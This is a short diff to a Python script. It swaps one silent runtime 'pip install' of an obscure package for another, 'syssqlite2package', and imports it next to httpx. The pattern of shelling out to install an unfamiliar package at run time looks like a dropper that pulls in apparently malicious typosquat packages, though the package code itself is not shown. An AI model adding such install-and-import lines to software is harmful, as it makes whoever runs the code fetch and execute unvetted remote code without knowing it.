@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptographymodule")
-import pycryptographymodule
+os.system("pip install syssqlite2package")
+import syssqlite2package
 import json
 import httpx
 import time
